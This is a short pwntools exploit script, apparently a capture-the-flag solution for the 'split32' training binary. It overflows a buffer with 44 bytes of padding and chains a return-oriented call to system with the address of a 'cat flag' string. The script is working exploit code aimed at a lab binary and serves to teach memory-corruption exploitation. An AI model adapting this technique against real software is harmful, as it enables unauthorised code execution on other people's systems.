# -*- coding: utf-8 -*-
from pwn import *
p = process('./split32')
p.recvuntil("> ")

call_system = 0x08048430
cat_flag = 0x0804A030
pwnme = 0x080485F6
payload = "a" * 44 + p32(call_system) + p32(pwnme) + p32(0x0804A030)
p.sendline(payload)
p.interactive()


